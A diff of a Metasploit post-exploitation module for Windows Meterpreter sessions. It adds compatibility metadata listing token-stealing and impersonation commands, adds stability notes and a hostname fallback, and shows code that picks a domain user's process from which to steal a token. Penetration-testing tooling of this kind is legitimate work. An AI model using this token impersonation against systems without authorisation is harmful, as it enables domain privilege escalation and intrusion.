@@ -26,7 +26,23 @@ class MetasploitModule < Msf::Post
         'License' => MSF_LICENSE,
         'Author' => 'Joshua Abraham <jabra[at]rapid7.com>',
         'Platform' => [ 'win' ],
-        'SessionTypes' => [ 'meterpreter' ]
+        'SessionTypes' => [ 'meterpreter' ],
+        'Compat' => {
+          'Meterpreter' => {
+            'Commands' => %w[
+              incognito_impersonate_token
+              incognito_list_tokens
+              stdapi_sys_config_getuid
+              stdapi_sys_config_steal_token
+              stdapi_sys_process_get_processes
+            ]
+          }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => [IOC_IN_LOGS, CONFIG_CHANGES]
+        }
       )
     )
     register_options(
@@ -117,7 +133,7 @@ class MetasploitModule < Msf::Post
     ## token is a Domain User
     else
       session.sys.process.get_processes.sort_by { rand }.each do |x|
-        if ((x['user'] == domain_user) && (target_pid == ''))
+        if (x['user'] == domain_user) && (target_pid == '')
           target_pid = x['pid']
           print_status("Found token for #{domain_user}")
         end
@@ -338,7 +354,9 @@ class MetasploitModule < Msf::Post
 
   # Run Method for when run command is issued
   def run
-    print_status("Running module on '#{sysinfo['Computer']}'")
+    hostname = sysinfo.nil? ? cmd_exec('hostname') : sysinfo['Computer']
+    print_status("Running module on #{hostname} (#{session.session_host})")
+
     if datastore['ADDTODOMAIN']
       print_status('Domain Mode')
       domain_mode
